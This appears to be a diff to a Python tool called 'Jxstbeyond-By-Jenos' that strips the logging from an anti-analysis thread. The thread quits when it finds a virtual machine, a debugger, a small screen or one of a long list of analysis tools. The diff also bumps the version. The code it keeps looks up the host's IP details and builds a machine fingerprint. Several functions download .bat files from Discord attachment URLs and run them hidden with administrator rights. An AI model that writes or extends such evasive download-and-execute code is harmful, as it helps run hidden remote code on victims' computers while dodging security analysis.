@@ -37,17 +37,16 @@ class AntiDebug(Thread):
         Thread.__init__(self)
 
     def detect_vm(self):
-        print("AntiDebug thread is running detect_vm ...")
+        
         if (hasattr(sys, 'real_prefix')):
             sys.exit(0)
 
     def detect_core(self):
-        print("AntiDebug thread is running detect_core ...")
+        
         if (cpu_count() == 1):
             sys.exit(0)
 
     def check_for_process(self):
-        print("AntiDebug thread is running check_for_process ...")
         for proc in process_iter():
             try:
                 for name in ['proxifier', 'graywolf', 'extremedumper', 'cheatengine', 'zed', 'exeinfope', 'dnspy', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'reverse', 'simpleassemblyexplorer', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'regmon', 'diskmon', 'procmon', 'http', 'traffic', 'packet', 'debuger', 'dbg', 'ida', 'dumper', 'pestudio', 'hacker', "vboxservice.exe","vboxtray.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser","VGAuthService.exe","vmacthlp.exe","vmsrvc.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe","qemu-ga.exe","joeboxcontrol.exe","joeboxserver.exe","joeboxserver.exe"]:
@@ -60,18 +59,17 @@ class AntiDebug(Thread):
                 sys.exit(0)
 
     def check_for_debugger(self):
-        print("AntiDebug thread is running check_for_debugger ...")
+        
         if (windll.kernel32.IsDebuggerPresent() != 0 or windll.kernel32.CheckRemoteDebuggerPresent(
                 windll.kernel32.GetCurrentProcess(), False) != 0):
             sys.exit()
 
     def detect_screen_syze(self):
-        print("AntiDebug thread is running detect_screen_syze ...")
+        
         if (windll.user32.GetSystemMetrics(0) <= 200 or windll.user32.GetSystemMetrics(1) <= 200):
             sys.exit()
             
     def detect_server(self):
-        print("AntiDebug thread is running detect_server ...")
         if platform.system() == 'Linux':
             print("Running on a Linux server.")
         elif platform.system() == 'Windows':
@@ -83,7 +81,6 @@ class AntiDebug(Thread):
 
     def run(self):
         try:
-            print("AntiDebug thread is running run all ...")
             self.detect_screen_syze()
             self.detect_core()
             self.detect_vm()
@@ -114,7 +111,7 @@ new_hwid = generate_hwid()[:16]
 hw = gethwid()[:15]
 mypcname = os.getlogin()
 NameProject = ("Jxstbeyond-By-Jenos")
-Version = ("1.5")
+Version = ("1.6")
 hwiduuid = f'''{NameProject} [{hw}-{mypcname}-{new_hwid}]''' 
 ipinfo = requests.get('https://ipinfo.io/json')
 ipinfojson = ipinfo.json()
@@ -389,7 +386,7 @@ def cmdset4_jenos(event):
                 _doHideBatch.close()
         else:
             run_as_admin()
-def RunSuperiorPunching():
+def RunSuperiorPunching(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319205416980/RunSuperiorPunching.bat?ex=6582ce36&is=65705936&hm=19848aee167dd63bc643b961b8fe72b01f7654180bace8c9839c28ade8664d17&"
         if is_admin(): 
             try:
@@ -407,7 +404,7 @@ def RunSuperiorPunching():
         else:
             run_as_admin()
 
-def RunUnbeatableNetwork():
+def RunUnbeatableNetwork(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319511613561/RunUnbeatableNetwork.bat?ex=6582ce36&is=65705936&hm=ae204501010896df377e0ef3d57a0b27c79f9cf218d09855a04ef711e1e3520a&"
         if is_admin(): 
             try:
@@ -425,7 +422,7 @@ def RunUnbeatableNetwork():
         else:
             run_as_admin()
 
-def Y2KREALPUNCH():
+def Y2KREALPUNCH(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918319826178128/Y2KREALPUNCH.bat?ex=6582ce36&is=65705936&hm=aaaf5e603791e9695e0ed274e89ce708b4e6f7af7ba30e84e980553b60538619&"
         if is_admin(): 
             try:
@@ -442,7 +439,7 @@ def Y2KREALPUNCH():
                 _doHideBatch.close()
         else:
             run_as_admin()
-def J3Ke3NEtwork():
+def J3Ke3NEtwork(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918320149135370/J3Ke3NEtwork.bat?ex=6582ce36&is=65705936&hm=38d55d1972ac2d3b8955ad3a2470d3c91dc89405d28fc3efeb30ae5a03494654&"
         if is_admin(): 
             try:
